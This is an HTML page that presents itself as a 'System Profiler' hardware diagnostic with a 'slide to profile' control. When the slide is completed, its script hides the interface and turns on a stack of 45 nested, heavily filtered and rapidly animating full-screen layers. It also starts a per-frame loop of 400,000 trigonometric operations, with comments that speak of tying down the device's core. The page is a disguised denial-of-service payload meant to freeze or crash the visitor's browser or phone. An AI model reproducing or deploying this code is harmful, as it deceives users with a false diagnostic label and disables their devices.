<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Hardware Diagnostic Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px 80px 20px;
            overflow: hidden;
            position: relative;
        }

        .header-section {
            text-align: center;
            margin-top: 60px;
            z-index: 10;
        }

        h1 {
            font-size: 26px;
            font-weight: 400;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
        }

        p {
            color: #8e8e93;
            font-size: 14px;
            line-height: 1.4;
            max-width: 280px;
            margin: 0 auto;
        }

        .slider-container {
            width: 100%;
            max-width: 340px;
            margin-bottom: 40px;
            z-index: 10;
        }

        .slider-track {
            position: relative;
            width: 100%;
            height: 76px;
            background: rgba(35, 35, 35, 0.45);
            border-radius: 38px;
            display: flex;
            align-items: center;
            padding: 4px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden;
        }

        .slider-text {
            position: absolute;
            width: 100%;
            text-align: center;
            left: 0;
            font-size: 16px;
            font-weight: 500;
            pointer-events: none;
            background: linear-gradient(90deg, #4d4d4d 0%, #fff 50%, #4d4d4d 100%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 2.5s infinite linear;
            padding-left: 44px;
        }

        @keyframes shine {
            0% { background-position: -100% 0; }
            100% { background-position: 100% 0; }
        }

        .slider-handle {
            width: 68px;
            height: 68px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            z-index: 2;
            box-shadow: 0 3px 8px rgba(0,0,0,0.3);
            touch-action: none;
        }

        .icon {
            color: #000;
            font-size: 26px;
            transform: scaleX(-1);
        }

        #payload-matrix {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            z-index: 999999;
            pointer-events: none;
            transform-style: preserve-3d;
            -webkit-transform-style: preserve-3d;
            perspective: 800px;
            -webkit-perspective: 800px;
        }

        body.ignited #payload-matrix {
            display: block !important;
        }

        .nitro-layer {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0; left: 0;
            background: linear-gradient(45deg, rgba(255,0,0,0.15), rgba(0,0,255,0.15));
            backdrop-filter: blur(25px) saturate(300%) contrast(200%);
            -webkit-backdrop-filter: blur(25px) saturate(300%) contrast(200%);
            mix-blend-mode: difference;
            will-change: transform, filter;
            animation: hybridStress 0.05s infinite alternate ease-in-out;
            transform-style: preserve-3d;
            -webkit-transform-style: preserve-3d;
        }

        @keyframes hybridStress {
            0% { transform: translate3d(5px, -5px, 20px) rotateX(2deg) scale(1.05); filter: hue-rotate(0deg); }
            100% { transform: translate3d(-5px, 5px, -20px) rotateY(-2deg) scale(0.95); filter: hue-rotate(180deg); }
        }
    </style>
</head>
<body>

    <div class="header-section">
        <h1>System Profiler</h1>
        <p>Runs an integrated hardware cross-layer diagnostics routine.</p>
    </div>

    <div class="slider-container">
        <div class="slider-track" id="main-track">
            <div class="slider-text">slide to profile</div>
            <div class="slider-handle" id="main-handle">
                <span class="icon">⟳</span>
            </div>
        </div>
    </div>

    <div id="payload-matrix"></div>

    <script>
        let isActive = false;

        function buildMatrix() {
            const container = document.getElementById('payload-matrix');
            let currentParent = container;

            // Balanced structural depth to target composition logic directly
            for (let i = 0; i < 45; i++) {
                const layer = document.createElement('div');
                layer.className = 'nitro-layer';
                
                if (i % 3 === 0) {
                    layer.style.animationDuration = '0.08s';
                    layer.style.mixBlendMode = 'exclusion';
                }
                
                currentParent.appendChild(layer);
                currentParent = layer;
            }
        }

        function mathematicalSaturator() {
            if (!isActive) return;
            
            // Mathematical arithmetic thread blocks to tie down the application core
            let targetValue = 0;
            for (let i = 0; i < 400000; i++) {
                targetValue += Math.sin(i) * Math.cos(i) * Math.tan(i);
            }
            
            // Continues processing request cycles alongside layout rendering
            window.crypto.getRandomValues(new Uint32Array(500));
            
            requestAnimationFrame(mathematicalSaturator);
        }

        function triggerDetonation() {
            document.querySelector('.header-section').style.opacity = '0';
            document.querySelector('.slider-container').style.opacity = '0';
            
            isActive = true;
            document.body.classList.add('ignited');
            
            // Fires simultaneous background compute loop
            mathematicalSaturator();
        }

        function setupSlider() {
            const handle = document.getElementById('main-handle');
            const track = document.getElementById('main-track');
            
            let isDragging = false;
            let startX = 0;
            let maxDelta = 0;

            function getClientX(e) {
                return e.touches ? e.touches[0].clientX : e.clientX;
            }

            function onStart(e) {
                isDragging = true;
                startX = getClientX(e);
                maxDelta = track.clientWidth - handle.clientWidth - 8;
                handle.style.transition = 'none';
            }

            function onMove(e) {
                if (!isDragging) return;
                const currentX = getClientX(e);
                let deltaX = currentX - startX;

                if (deltaX < 0) deltaX = 0;
                if (deltaX > maxDelta) deltaX = maxDelta;

                handle.style.transform = `translateX(${deltaX}px)`;

                const textElement = track.querySelector('.slider-text');
                textElement.style.opacity = (1 - (deltaX / maxDelta));

                if (deltaX >= maxDelta) {
                    isDragging = false;
                    triggerDetonation();
                }
            }

            function onEnd() {
                if (!isDragging) return;
                isDragging = false;
                handle.style.transition = 'transform 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                handle.style.transform = 'translateX(0px)';
                const textElement = track.querySelector('.slider-text');
                textElement.style.transition = 'opacity 0.3s';
                textElement.style.opacity = '1';
            }

            handle.addEventListener('touchstart', onStart, { passive: true });
            window.addEventListener('touchmove', onMove, { passive: false });
            window.addEventListener('touchend', onEnd);

            handle.addEventListener('mousedown', onStart);
            window.addEventListener('mousemove', onMove);
            window.addEventListener('mouseup', onEnd);
        }

        buildMatrix();
        setupSlider();
    </script>
</body>
</html>
